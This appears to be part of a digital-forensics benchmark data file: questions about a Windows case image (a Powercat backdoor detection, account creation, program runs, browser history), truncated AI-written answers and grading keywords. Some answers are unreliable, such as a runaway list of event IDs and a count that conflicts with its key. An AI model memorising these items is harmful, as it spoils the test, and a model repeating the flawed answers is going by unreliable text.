+MAG88,When did the PowerShell backdoor event occur?,"Based on my analysis, I can now provide the exact timeline of the PowerShell backdoor event:
+
+The PowerShell backdoor event occurred on February 11, 2022 at 23:01:26.607 UTC (Detection Time in the Windows Defender event).
+
+Key events:
+23:01:26.607 UTC: Windows Defender detected ""Backdoor:PowerShell/Powercat.A"" via AMSI scanning
+23:01:26.610 UTC: First Windows Defender Event ID 1116 (warning) logged
+23:01:28.",2022-02-10 / 2022-02-11 / 2022-02-12 / February  |  PowerShell / powershell / backdoor
+MAG89,When was the first Windows Defender detection?,"These results don't show Windows Defender detection events. Let me search for specific Windows Defender event IDs that indicate detections (typically 1116, 1117, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053,",2022-02-09 / 2022-02-12 / February / Defender  |  1116 / detection
+MAG90,When was the minecraftsteve user account created?,"The minecraftsteve user account was created on February 12, 2022 at 01:29:43.136 UTC (Event ID 4720). The account has SID S-1-5-21-3341181097-1059518978-806882922-1002 and was created by the SYSTEM account (S-1-5-18).",2022-02-12 / February 12  |  01:29
+MAG91,When was the last execution of JAVA.EXE (Minecraft)?,"Based on the forensic analysis:
+
+The last execution of JAVA.EXE was on 2022-02-12 at 23:18:23 according to Prefetch records. This Java execution correlates with Minecraft activity:
+
+Java was executed at 23:18:23 (last Prefetch record)
+Minecraft world files were accessed/modified at 23:38:31 (MFT timestamps for world files)
+Minecraft UserAssist registry entries show activity at 23:39:54
+The Minecraft start.",2022-02-12 / February 12  |  23:18
+MAG92,When was CMD.EXE last executed?,"CMD.EXE was last executed on 2022-02-12 at 23:38:07 according to Prefetch records. This is the most recent timestamp from the analysis, showing execution from both SYSTEM32 and SYSWOW64 paths throughout February 12, 2022, with the final execution at 23:38:07.",2022-02-12 / February 12  |  23:38
+MAG93,When was the matrix.bat script created?,"The matrix.bat script was created on February 12, 2022 at 00:41:13.8495898 UTC. The file is located at "".\Users\Patrick\lolololol\matrix.bat"" and is 164 bytes in size.",2022-02-12 / February 12  |  00:41
+MAG94,When was the Evidence folder created?,The Evidence folder was created on 2022-02-11 at 22:50:37.4275884 (UTC). The folder is located at `C:\Users\Patrick\Documents\Evidence` and was first accessed by Windows Explorer shortly after creation at 22:56:37.,2022-02-11 / February 11  |  22:5 / 22:56 / 22:50
+MAG95,When were the stamp YouTube videos watched?,"Based on the browser history, stamp-related YouTube videos were watched on February 5, 2022:
+
+01:18:12 ""10 SUPER RARE STAMPS WORTH MONEY EXTREMELY VALUABLE STAMPS""
+01:24:38 ""Pawn Stars: 'You Don't See This Too Often' *MAJOR Value for MISPRINTED Stamps*""
+01:32:22 ""How to Value and Sell a Stamp Collection""
+06:04:40 ""A History of America in Thirty-six Postage Stamps, Chris West, Maynard Sundman Lecture 2014""
+07:18:50 ""The Art o",2022-02-05 / February 5  |  stamp / Stamp
+MAG96,How many browser history records reference minecraft.net?,"Based on my analysis:
+
+Search for ""www.minecraft.net"" returned 22 browser history records
+Search for ""checkout.minecraft.net"" returned 2 browser history records
+The earlier browser analysis showed 29 total visits to ""www.minecraft.net"" domain
+
+From the browser analysis summary data, there are 29 visits to ""www.minecraft.net"" and 2 visits to ""checkout.minecraft.net"", making a total of 31 browser history records that reference minecraft.",minecraft.net / Minecraft  |  22 / 19 / twenty
+MAG97,How many browser history records reference youtube.com?,"Based on the search results, there are 10 browser history records that reference youtube.com.",youtube.com / YouTube  |  10 / 12 / ten / twelve
+MAG98,What chess-related website did Patrick visit?,"Patrick visited Chess.com (www.chess.com). The visits occurred on January 22, 2022 at 01:19:58 UTC, where he accessed the Chess.com homepage and an account activation page for username ""ChessGod0107"".",chess.com / chess
+MAG99,What Minecraft page did Patrick visit first?,"Looking at all the browser history, the earliest Minecraft-related activity appears to be the authentication/login flow starting at 04:53:08.414104Z. The sequence shows:
+
+1. 04:53:08.414104Z Xbox Live authentication redirects (sisu.xboxlive.com, login.live.com)
+2. 04:53:09.864431Z Minecraft profile page (https://www.minecraft.net/en-us/profile)
+3. 04:53:25.553886Z ""What is Minecraft?"" page (https://www.minecraft.net/about-minecraft)
+4.",Get Minecraft / minecraft.net  |  2022-02-04 / 2/4/2022 / February 4
+MAG100,What Discord channel verification appears in browser/JumpList?,"Found one Discord channel verification in browser history:
+
+Discord email verification URL: `https://discord.com/verify#token=eyJpZCI6OTM0MTk3NzgwMTk1NDY3MzA1LCJlbWFpbCI6InBiZW50bGV5MDEwN0BnbWFpbC5jb20ifQ.YesmDw.DmjbZiQHboDnE9CnQy4wHzA7SNU`
+Timestamp: 2022-01-22T00:33:06.846895Z
+Browser: Chromium
+Email in token: pbentley0107@gmail.",discord.com / Discord  |  verify / verification
